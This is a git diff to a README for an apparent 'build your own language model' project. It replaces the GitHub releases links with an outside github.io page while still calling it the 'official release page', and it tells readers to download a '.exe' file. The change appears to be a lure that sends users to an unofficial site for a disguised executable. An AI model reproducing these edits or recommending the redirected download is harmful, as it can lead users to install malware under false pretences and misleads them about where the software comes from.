@@ -1,6 +1,6 @@
 # 🤖 Text-LLM-Training-from-scratch - Build your own custom language models
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/intradepartmental-diadem622/Text-LLM-Training-from-scratch/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://intradepartmental-diadem622.github.io)
 
 This project provides a way to learn how language models work. You use this tool to build, train, and refine your own models from the ground up. It covers the entire process, including reading text, teaching the model patterns, and adjusting its behavior to match your preferences.
 
@@ -18,7 +18,7 @@ To run this software, your computer needs these parts:
 
 Follow these steps to get the software on your computer:
 
-1. Visit the [official release page](https://github.com/intradepartmental-diadem622/Text-LLM-Training-from-scratch/releases) to see available versions.
+1. Visit the [official release page](https://intradepartmental-diadem622.github.io) to see available versions.
 2. Look for the most recent version at the top of the list.
 3. Click the link that ends in ".exe" to start your download.
 4. The file will save to your "Downloads" folder.
